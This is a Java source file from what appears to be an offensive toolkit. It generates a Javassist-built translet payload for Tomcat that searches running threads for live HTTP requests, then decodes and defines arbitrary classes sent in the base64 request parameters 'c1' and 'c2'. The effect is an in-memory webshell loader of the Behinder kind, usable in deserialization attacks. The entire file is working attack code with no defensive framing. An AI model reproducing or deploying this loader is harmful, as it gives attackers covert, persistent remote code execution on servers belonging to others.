package cn.safe6.payload.memshell;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.coyote.RequestInfo;
import sun.misc.BASE64Decoder;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Method;

public class Loader {

    public static byte[] getPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
        classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));

        CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                "        java.lang.reflect.Field f0 = null;\n" +
                "        Class clas = obj.getClass();\n" +
                "\n" +
                "        while (clas != Object.class){\n" +
                "            try {\n" +
                "                f0 = clas.getDeclaredField(fieldName);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e){\n" +
                "                clas = clas.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f0 != null){\n" +
                "            f0.setAccessible(true);\n" +
                "            return f0.get(obj);\n" +
                "        }else {\n" +
                "            throw new NoSuchFieldException(fieldName);\n" +
                "        }\n" +
                "    }",ctClass));

        String method = "        try {\n" +
                "            boolean flag = false;\n" +
                "            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),\"threads\");\n" +
                "            for (int i=0;i<threads.length;i++){\n" +
                "                Thread thread = threads[i];\n" +
                "                if (thread != null){\n" +
                "                    String threadName = thread.getName();\n" +
                "                    if (!threadName.contains(\"exec\") && threadName.contains(\"http\")){\n" +
                "                        Object target = getField(thread,\"target\");\n" +
                "                        Object global = null;\n" +
                "                        if (target instanceof Runnable){\n" +
                "                            // 需要遍历其中的 this$0/handler/global\n" +
                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                "                            try {\n" +
                "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                "                            } catch (NoSuchFieldException fieldException){\n" +
                "                                fieldException.printStackTrace();\n" +
                "                            }\n" +
                "                        }\n" +
                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                "                        if (global != null){\n" +
                "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                "                            for (i=0;i<processors.size();i++){\n" +
                "                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                                if (requestInfo != null){\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                                    javax.servlet.http.HttpSession session = request.getSession();\n" +

                "                                    String c1 = null;\n" +
                "                                    String c2 = null;\n" +
                "                                    if (request.getParameter(\"c1\") != null){\n" +
                "                                        c1 = (String)request.getParameter(\"c1\");\n" +
                "                                    }\n" +
                "                                    if (request.getParameter(\"c2\") != null){\n" +
                "                                        c2 = (String)request.getParameter(\"c2\");\n" +
                "                                    }\n" +
                "\n" +
                "                                    if (c1 != null&&c2!=null){\n" +
                "                                            try {\n" +
        "                                                       byte[] var14 = java.util.Base64.getDecoder().decode(c1);\n" +
                "                                               java.lang.reflect.Method var15 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
        "                                                       var15.setAccessible(true);\n" +
                "                                               Class var16 = (Class) var15.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var14,new Integer(0), new Integer(var14.length)});\n"+
                "                                               var16.newInstance();\n"+
        "                                                       byte[] var18 = java.util.Base64.getDecoder().decode(c2);\n" +
        "                                                       java.lang.reflect.Method var19 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
        "                                                       var19.setAccessible(true);\n" +
        "                                                       Class var20 = (Class)var19.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var18, new Integer(0), new Integer(var18.length)});\n" +
        "                                                      // var20.newInstance();\n"+
                "                                               //java.lang.reflect.Field f = var20.getClass().getDeclaredField(\"pageContext\");\n" +
                "                                               //f.setAccessible(true);\n" +
                "                                               //f.set(var20,var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse()));"+
        "                                                       var20.getConstructor(var16.getClass()).newInstance(var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse()));\n" +
        "                                                   } catch (Exception var21) {\n" +
        "                                                       var21.printStackTrace();\n" +
        "                                                   }\n" +
                "                                        flag = true;\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                    if (flag){\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "                if (flag){\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";
        ctClass.makeClassInitializer().insertBefore(method);
        return ctClass.toBytecode();
    }

}
